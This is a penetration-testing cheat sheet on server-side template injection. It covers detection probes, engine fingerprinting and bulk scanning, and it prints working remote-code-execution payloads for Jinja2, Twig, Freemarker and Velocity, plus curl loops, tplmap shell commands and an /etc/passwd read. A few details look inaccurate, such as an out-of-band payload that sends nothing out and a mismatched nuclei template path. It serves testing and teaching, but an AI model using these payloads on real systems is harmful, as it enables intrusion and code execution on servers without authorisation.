# SSTI (Server-Side Template Injection)

> Comprehensive SSTI testing methodology for bug bounty hunters & penetration testers (2025–2026)

## Overview

Server-Side Template Injection (SSTI) occurs when user input is unsafely concatenated into server-side templates (e.g., `render("Hello " + user_input)`), allowing injection of template syntax leading to code execution, file read, RCE, etc. Often mistaken for reflected XSS. Based on OWASP SSTI Testing Guide, PortSwigger SSTI research, PayloadsAllTheThings (2026), and recent trends (polyglot detection, blind boolean/time/OOB exploitation, sandbox escapes in modern engines like Jinja2 3.x/Twig 3.x, error-guessing fingerprinting, chained with file upload/XXE).

## Quick Reference: Payloads & Template Engines

| Payload | Expected Output |
|---------|------------------|
| `{{7*7}}` | 49 |
| `${7*7}` | 49 |
| `{{7*'7'}}` | 7777777 |
| `<%= 7*7 %>` | 49 |
| `{{config}}` | Config info |

| Engine | Payloads |
|--------|----------|
| Jinja2 | `{{7*7}}` |
| Twig | `{{7*7}}` |
| ERB | `<%= 7*7 %>` |
| Jade | `#{7*7}` |
| Freemarker | `${7*7}` |

## Methodology

### 1. Target & Input Identification
- **Common vulnerable parameter names:** `template=`, `preview=`, `id=`, `view=`, `activity=`, `name=`, `content=`, `redirect=`, `page=`, `message=`, `title=`, `description=`, `body=`, `text=`, `comment=`, `bio=`, `greeting=`, `email=`, `subject=`, `newsletter=`, `report=`, `export=`, `custom=`
- **Additional input sources:** Headers (`Referer`, `User-Agent` if rendered), Cookies (if reflected in templates), API bodies (JSON/XML with template-like fields), Error/404/500 pages echoing input, Custom user-generated content (blogs, wikis, marketing tools)
- **Context detection:** Math evaluation (`{{7*7}}`), string repetition (`{{7*'7'}}`), engine-specific errors, behavior change vs normal input

### 2. Template Engine Identification
- **Math/string differences:** `{{7*'7'}}` (Jinja2=7777777, Twig=49)
- **Error messages:** `ZeroDivisionError` (Python/Jinja2), `java.lang.ArithmeticException` (Java/Freemarker), `Twig_Error_Syntax` (PHP/Twig)
- **Object introspection:** `{{config}}`, `{{self}}`, `${T(java.lang.Runtime)}`
- **Use interactive tables:** PayloadsAllTheThings, Hackmanit Template Injection Table

### 3. Exploitation by Engine (2025–2026)
- **Python (Jinja2, Mako, Tornado):** RCE via `{{ ''.__class__.__mro__[1].__subclasses__()[<index>].__init__.__globals__['os'].popen('id').read() }}`
- **PHP (Twig, Smarty):** Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`; Smarty: `{php}echo \`id\`;{/php}`
- **Java (Freemarker, Velocity, Thymeleaf):** Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}`; Velocity: `$class.inspect("java.lang.Runtime").type.getRuntime().exec("id").waitFor()`
- **Others (ERB/Ruby, Handlebars/JS):** See PayloadsAllTheThings for engine-specific chains

### 4. Blind Exploitation Techniques
- **Boolean:** Compare valid (`{{7*7}}`) vs invalid (`{{7*0}}`) responses
- **Time-based:** `{{ sleep(5) }}` or Java `Runtime.exec("sleep 5")`
- **Out-of-band:** Exfil via DNS/HTTP (`{{request.application.__self__.__init__.__globals__['url_for']('__main__', **{'__globals__':{}})}}`)

## Tool Installation

```bash
# Core reconnaissance & fuzzing tools
go install github.com/ffuf/ffuf@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# SSTI-specific tools
git clone https://github.com/epinna/tplmap.git  # Gold standard SSTI scanner
git clone https://github.com/vladko312/SSTImap.git  # Fork with blind support
pip install -r tplmap/requirements.txt

# Parameter discovery & fuzzing
pip install arjun
go install github.com/tomnomnom/gf@latest

# Payload generation & wordlists
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
```

## Testing Commands

### 1. Parameter Discovery & Enumeration

```bash
# Extract URLs with potential SSTI parameters using gf patterns
gf ssti crawledurls.txt > gf-ssti.txt  # Filter using SSTI pattern

# Custom pattern for additional SSTI vectors
grep -E "(template=|preview=|id=|view=|activity=|name=|content=|redirect=|page=|message=|title=|description=|body=|text=|comment=|bio=|greeting=|email=|subject=|body=|newsletter=|report=|export=|custom=)" crawledurls.txt | anew ssti-params-additional.txt

# Extract from JavaScript files
cat livejslinks.txt | xargs -I@ curl -s @ | grep -Eo "(var|let|const)\s+\w+\s*=\s*['\"].*?['\"]" | cut -d'=' -f2 | tr -d " '\"" | sort -u > js-ssti-params.txt
```

### 2. Basic Detection Probes

```bash
# Universal polyglot detection
cat gf-ssti.txt | qsreplace '${{<%[%'"}}%\' | httpx -silent -match-string "error\|exception\|traceback" | tee ssti-polyglot-hits.txt

# Math evaluation detection (Jinja2/Twig)
cat gf-ssti.txt | qsreplace '{{7*7}}' | httpx -silent -match-string "49" | tee ssti-math-hits.txt

# String repetition detection (Jinja2)
cat gf-ssti.txt | qsreplace '{{7*'\''7'\''}}' | httpx -silent -match-string "7777777" | tee ssti-string-hits.txt

# Alternative payloads for different engines
cat gf-ssti.txt | qsreplace '${7*7}' | httpx -silent -match-string "49" | tee ssti-freemarker-hits.txt
cat gf-ssti.txt | qsreplace '<%= 7*7 %>' | httpx -silent -match-string "49" | tee ssti-erb-hits.txt
cat gf-ssti.txt | qsreplace '#{7*7}' | httpx -silent -match-string "49" | tee ssti-jade-hits.txt
```

### 3. Automated Scanning with Tplmap & SSTImap

```bash
# Tplmap automated scanning
python3 tplmap.py -u 'https://target.com/page?name=*' --os-shell  # Interactive shell if vulnerable

# SSTImap automated scanning
python3 sstimap.py --load-urls gf-ssti.txt -i --run  # Load URLs and run interactive detection

# Nuclei templates for SSTI
nuclei -u https://target.com -t ~/nuclei-templates/ssrf/ -o nuclei-ssti.txt  # Note: may need SSTI-specific templates
```

### 4. Engine Fingerprinting & Payload Testing

```bash
# Engine identification via error messages
cat gf-ssti.txt | qsreplace '{{7/0}}' | httpx -silent -match-string "ZeroDivisionError\|Division by zero" | tee ssti-python-hits.txt
cat gf-ssti.txt | qsreplace '{{7*'\''7'\''}}' | httpx -silent -match-string "7777777" | tee ssti-jinja2-hits.txt

# Object introspection payloads
cat gf-ssti.txt | qsreplace '{{config}}' | httpx -silent -match-string "SECRET_KEY\|database\|password" | tee ssti-config-hits.txt
cat gf-ssti.txt | qsreplace '{{self}}' | httpx -silent -match-string "Template\|Twig" | tee ssti-self-hits.txt
```

### 5. Advanced Exploitation Commands

```bash
# Python Jinja2 RCE (find correct subclass index)
for index in {0..500}; do
  echo "Trying index $index"
  curl -s "https://target.com/page?name={{''.__class__.__mro__[1].__subclasses__()[$index].__init__.__globals__['os'].popen('id').read()}}" | grep -q "uid=" && echo "RCE at index $index"
done

# PHP Twig RCE
curl -s "https://target.com/page?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"

# Java Freemarker RCE
curl -s "https://target.com/page?name=<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}"

# File read via file protocol (if supported)
curl -s "https://target.com/page?name=file:///etc/passwd" | grep -q "root:" && echo "File read possible"
```

### 6. Blind SSTI Detection (Time-based)

```bash
# Time-based detection with sleep
cat gf-ssti.txt | qsreplace '{{sleep(5)}}' | httpx -silent -timeout 10 -measurement-string "Response time > 5s"

# Compare response times
for url in $(cat gf-ssti.txt); do
  normal_time=$(curl -s -o /dev/null -w "%{time_total}" "$url")
  payload_time=$(curl -s -o /dev/null -w "%{time_total}" "$(echo "$url" | qsreplace '{{sleep(2)}}')")
  if (( $(echo "$payload_time - $normal_time > 1.5" | bc -l) )); then
    echo "Possible blind SSTI: $url"
  fi
done
```

### 7. Chained Exploitation (SSTI + File Upload)

```bash
# Upload malicious template file (if file upload exists)
echo '{{7*7}}' > payload.tpl
curl -X POST -F 'file=@payload.tpl' https://target.com/upload

# Access uploaded template to trigger SSTI
curl -s 'https://target.com/uploads/payload.tpl'
```


### 8. Handy combinations for pentest workflow

1. Crawl → save URLs:

```bash
python sstimap.py -u "https://example.com" -c 2 -f --save-urls gf-ssti.txt --save-forms forms.txt
```

2. Triage saved URLs:

```bash
python sstimap.py --load-urls gf-ssti.txt -i --run
```

3. If vuln detected → interact:

```bash
# start interactive shell on engine
python sstimap.py -u "http://vuln/?name=1" -i
# then use `--os-shell` or `--eval-shell` as needed interactively
```

## Advanced Techniques & Bypasses (2025–2026 Trends)

- **Polyglot + obfuscation:** Double‑encode, case variation, nested expressions
- **Sandbox escapes:** Jinja2/Twig modern bypasses via custom filters/globals
- **Chained exploitation:** SSTI + file upload (template file) → persistent RCE
- **Recent exotic:** Error‑guessing for disabled introspection, prototype pollution in JS engines
- **WAF bypass:** Use alternative delimiters, whitespace, line breaks, Unicode encoding

## Detection & Verification

- **Math/string evaluated server‑side** – e.g., `49` appears in response
- **Engine‑specific errors leaked** – e.g., `ZeroDivisionError`, `Twig_Error_Syntax`
- **File read successful** – e.g., `/etc/passwd` contents leaked
- **Command output** – e.g., `id`, `whoami` results
- **Blind indicators** – time delays, OOB callbacks, side‑effects
- **PoC:** Screenshot of command execution, file read, or business impact

## Prevention (Developer View – OWASP Latest)

1. **Never concatenate user input into templates** – pass as data/context
2. **Use logic‑less engines** (Mustache, Handlebars strict mode)
3. **Sandbox** – Disable dangerous functions (e.g., Jinja `autoescape`, no `os`/`subprocess`)
4. **Auto‑escaping** + strict config (Twig sandbox extension)
5. **Validate/allow‑list input** for template features
6. **Least privilege** – Containerize / low‑priv process
7. **Regular SSTI testing** in CI/CD pipelines

## References

- **Checklist**: [Web‑Vulnerability‑Testing‑Checklist/SSTI.md](../Web‑Vulnerability‑Testing‑Checklist/SSTI.md)
- **PortSwigger Server‑Side Template Injection**: https://portswigger.net/web‑security/server‑side‑template‑injection
- **PayloadsAllTheThings – SSTI**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- **OWASP SSTI Testing Guide**: https://owasp.org/www‑project‑web‑security‑testing‑guide/latest/4‑Web_Application_Security_Testing/07‑Input_Validation_Testing/18‑Testing_for_Server_Side_Template_Injection
- **Recent 2025–2026 write‑ups**: Blind SSTI, sandbox escapes (YesWeHack, Intigriti bounties)

> **Happy (ethical) hunting** — SSTI still yields critical RCE in modern apps (emails, reports, custom pages) in 2026!
